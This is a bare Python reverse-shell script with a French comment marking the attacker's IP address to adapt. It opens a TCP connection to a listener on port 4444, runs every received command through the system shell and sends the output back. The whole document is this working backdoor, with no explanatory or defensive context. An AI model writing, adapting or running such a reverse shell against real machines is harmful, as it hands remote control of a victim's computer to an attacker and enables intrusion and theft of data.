import socket
import subprocess
import os

host = '192.168.1.100'  # 👉 IP de l'attaquant (à adapter)
port = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        client.send(output)
    except Exception as e:
        client.send(str(e).encode())

client.close()
